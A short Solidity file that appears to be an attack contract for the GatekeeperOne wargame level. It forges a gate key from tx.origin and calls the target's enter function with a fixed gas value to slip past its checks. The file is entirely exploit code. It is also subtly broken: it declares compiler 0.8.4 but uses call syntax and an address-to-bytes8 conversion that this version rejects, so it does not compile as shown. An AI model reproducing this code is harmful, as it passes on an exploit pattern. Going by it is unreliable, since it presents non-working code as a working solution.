//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.4;

interface GatekeeperOne{

}

contract GatekeeperOneHack {
    GatekeeperOne gate = GatekeeperOne(0x0F737A13B209fC35f0fd6138E5237A633a2Ee168);
    bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

    function enterGate() public {
        gate.call.gas(56348)(bytes4(keccak256('enter(bytes8)')), key);
    }
}